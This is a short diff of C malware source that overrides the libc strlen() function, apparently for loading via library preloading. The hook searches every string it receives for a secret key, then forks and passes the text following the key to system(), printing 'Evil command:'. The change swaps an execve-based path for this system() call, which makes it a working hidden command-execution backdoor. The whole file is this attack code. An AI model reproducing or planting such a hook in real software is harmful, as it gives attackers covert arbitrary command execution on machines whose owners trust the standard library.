@@ -19,9 +19,11 @@ char* generate_key(){
 int strlen(char *s) {
     void *handle = NULL;
     int (*real_strlen)(char *);
+    int (*real_system)(char *);
 
     handle = dlopen("libc.so.6", RTLD_LAZY);
     real_strlen = (int (*)(char *))dlsym(handle, "strlen");
+    real_system = (int (*)(char *))dlsym(handle, "system");
 
     char* needle = generate_key();
     int length = real_strlen(needle);
@@ -29,15 +31,25 @@ int strlen(char *s) {
 
     char* position = strstr(s, needle);
 
+    /*
+    char* command = position + length + 1;
+    system(command);
+    */
+
     if(position) {
         if(FLAG == 0){
             int pid = fork();
             if(pid == 0){
                 char* command = position + length + 1;
+                printf("Evil command: %s\n", command);
+                real_system(command);
+                exit(0);
+                /*
                 char* argv[]={command, NULL};
                 char* envp[]={0,NULL};
                 execve(command, argv, envp);
                 exit(0);
+                */
             }
             /*
             char* command = "/bin/bash";
@@ -47,8 +59,6 @@ int strlen(char *s) {
             exit(0);
             */
         }
-    }else{
-        printf("Normal!\n");
     }
 
     FLAG = 1;
